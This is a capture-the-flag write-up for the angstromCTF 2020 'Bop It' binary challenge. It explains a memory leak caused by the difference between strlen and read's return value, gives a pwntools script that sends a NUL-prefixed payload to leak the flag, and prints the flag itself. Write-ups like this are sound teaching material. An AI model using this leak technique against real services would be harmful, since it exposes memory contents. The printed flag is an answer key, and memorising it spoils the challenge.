# Bop It  
### Category: binary  
### Description:  
Can you [bop it](bop_it)? [Source](bop_it.c). Connect with `nc shell.actf.co
20702`.  
### Author: kmh

### Solution:  
In this challenge we got an ELF in which there is a little game that consist
in sending the first letter of what it gives us unless we get `Flag it!`.  
If we get flag statement it reads the flag from the file and asks us for it so
it can check the two strings. Whenever we send a string it sets `guessLen` to
the return vale of `read` function which returns the amount of data readed. If
we send a wrong flag it builds an error string with what we sent but there is
a problem: the buffer is built with the return value of `strlen` on our string
incremented by 35, in the end it prints out this buffer with the length set
with guessLen. How can we exploit this? With a NULL byte overflow!  
If we send a `\x00` followed by a random data we increment the return value of
guessLen but not the value of strlen so we can build a small `wrong` buffer
but guessLen is still large enough to leak memory! Let's build a python
automation script to play it and spray random data:

```py  
from pwn import *  
import time

def run(size):  
   p = remote('shell.actf.co', 20702)  
   exploit = '\x00' + 'A'*size

   while True:  
       a = p.readuntil('it!')  
       if 'Bop' in a:  
           p.sendline('B')  
       if 'Twist' in a:  
           p.sendline('T')  
       if 'Pull' in a:  
           p.sendline('P')  
       if 'Flag' in a:  
           p.sendline(exploit)  
           a = p.recvall()  
           print(a)  
           return  
  
for i in range(35, 150, 10):  
        run(i)  
```  
Let's run it and after some attempt we get the flag!

### Flag:  
```  
actf{bopp1ty_bop_bOp_b0p}  
```

Original writeup
(https://github.com/r00tstici/writeups/blob/master/angstromCTF_2020/bop_it/README.md).